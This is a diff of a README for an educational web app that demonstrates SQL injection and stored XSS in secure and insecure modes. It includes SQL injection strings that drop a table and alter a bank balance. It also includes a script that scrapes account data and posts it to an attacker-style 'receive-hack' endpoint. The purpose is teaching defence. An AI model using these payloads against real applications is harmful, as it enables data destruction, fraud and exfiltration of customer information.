@@ -1,6 +1,6 @@
 # Common Security Vulnerability Demo
 
-The purpose of this application is to illustrate some common security vulnerabilities in web applications. Understanding how these exploits work is critical in being able to defend against them. 
+The purpose of this application is to illustrate a few common security vulnerabilities in web applications. Understanding how these exploits work is critical in being able to defend against them. 
 
 ## Application Setup
 
@@ -8,9 +8,17 @@ This application runs in two different modes:
 * Secure - proper protections and being used to mitigate the attacks
 * Insecure - the application is exposed to attacks
 
-To run it in either mode, use the spring profile field when starting the app as follows
+To run it in either mode, use the spring profile field when starting the app as follows:
+
+Insecure
 
 `mvn spring-boot:run -Dspring.profiles.active=insecure`
+Use a browser to access `http://localhost:8080`
+
+Secure
+
+`mvn spring-boot:run -Dspring.profiles.active=secure`
+User a browser to access `http://localhost:8081`
 
 Currently, the application illustrates the following vulnerabilities
 * SQL Injection
@@ -26,7 +34,9 @@ For example:
 
 `' DROP TABLE customer; --`
 
-`' UPDATE bank_account SET balance=999999999 WHERE customer_id=1; --
+`' UPDATE bank_account SET balance=999999999 WHERE customer_id=2; --
+
+You may view the database by logging into the H2 console by clicking the link from the index page. The connection details are found in the application.properties file.
 
 Defending against this vulnerability can be done at multiple levels
 * ORM
@@ -38,7 +48,7 @@ To exploit this vulnerability, log in as a customer and inject the following jav
 
 `<script type="text/javascript">$(document).ready(function(){var accountInfo="";$("table").children("tbody").children("tr").each(function(){$(this).children("td").each(function(){accountInfo=accountInfo+";"+$(this).text();});});$.post("http://localhost:8080/receive-hack", {accountInfo:accountInfo});});alert("hacked");</script>`
 
-This attack will allow a malicious user to inject a script into the database that then will run on the employee level and expose customer details to an external web server controlled by the malicious user. In this case, it is simply the same app server as is running, but this would be different in a real attack.
+This attack will allow a malicious user to inject a script into the database that then will run on the employee level and expose customer details to another endpoint controlled by the malicious user. In this case, it is simply the same app server, but this would be different in a real attack.
 
 Defending against this vulnerability can be done at multiple levels
 * Validating user input 
